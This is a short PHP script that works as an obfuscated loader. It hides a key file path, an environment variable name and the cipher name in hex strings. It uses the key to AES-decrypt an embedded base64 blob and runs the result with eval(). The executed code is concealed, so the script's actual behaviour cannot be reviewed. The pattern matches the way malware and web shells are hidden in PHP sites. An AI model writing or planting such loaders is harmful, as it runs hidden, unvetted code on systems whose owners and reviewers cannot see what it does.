<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TlZrbC9CxsB7ieQ0V8awuw==');

$c=base64_decode(

'ycA1jlIM0AncQMa07xdEzFf+YnjwtJpigITWOPXhI/1m/DHEW2H2tYWjCGlNoKPxrSe2rn3Fhsai' .
'Dx0KUZps4Gc7zjc6SdVVmuR+jDnnfHQuY8vx4lSuXJIndJGqvSRzmttQGM+Cxvl21UgvYL8frx5M' .
'QrwoWOXgVd+8noO+FK16/Br+u6/bZwU1ehfq00EH/TLa2qLrAKqL1VS06YBXHy6f02+r3pgfHpq1' .
'pAQKDS0rEXM+IOCTGtvwD8eImtuTsadEFmpDZdsM9T2p1c24hABkP8ECHe950M1yo6dzaTUBhjhx' .
'fZ/fwskt7LRjaiC7EyuNtsVuF9COiRmqn4Lr7MehkoXn9boEwFASkONlaPT7UwzG4QIF3/TITJCK' .
'5Unqh4hIwREoUa6DfOB598hhtBiuNK2cMBCEnRcVh+bB4y6UFXjoGbdx40p9nyGe+QbIFvmIhP2h' .
'HY3HsO0/n1AtUvyJceyS1On4o8WI489Cdye2zB2WzLQ5Wm7lESANGSxz6Mey8c2n4s40P3VVAwxO' .
'jZBYqT1kqQuif2TNAVKmAakEdveAJYqvVOf1+STbQMzSobKske7ANImBKJIGZy46BfvPtYyxk4zN' .
'16f1TMCDD7X4+Rdem4gVE6Hn9qDG2WJ/dpSbWkxpuQWA73O3E10RSKHub/veIzv9K/tfgDcub95u' .
'grKMza5i1k/sXiWqGFhuCbdjipdeB74XKGeJtER8Gg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

